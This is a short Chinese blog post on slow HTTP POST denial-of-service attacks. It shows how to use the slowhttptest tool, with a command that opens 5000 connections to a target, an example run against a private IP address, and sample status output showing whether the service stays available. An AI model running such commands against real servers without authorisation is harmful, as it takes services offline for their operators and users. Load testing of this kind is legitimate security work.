---
title: 慢速HTTP POST攻击解析
date: 2025-10-30 14:42:34
category: 安全漏洞
tags: 安全漏洞
---

检测与实施工具
常用测试软件：slowhttptest

项目地址：https://github.com/shekyan/slowhttptest

安装指南：

详见官方Wiki：https://github.com/shekyan/slowhttptest/wiki

基本操作指令：

slowhttptest -c 5000 -u [目标地址]

参数 -c 5000 代表建立5000个并发连接。这种攻击属于基于HTTP协议的慢速拒绝服务攻击，每个连接都会完成TCP三次握手并与服务器保持长时间连接。

参数 -u 后需填写完整的目标地址，需包含协议头，如 http:// 或 https://。

测试实例：

bash
./slowhttptest -c 5000 -u https://192.168.1.3
运行状态反馈示例：

text
慢速HTTP测试在第50秒的状态：

初始化中： 0
等待中： 8
已连接： 1757
错误： 0
已关闭： 3
服务可用性： 是
若攻击生效，服务可用性将显示为“否”。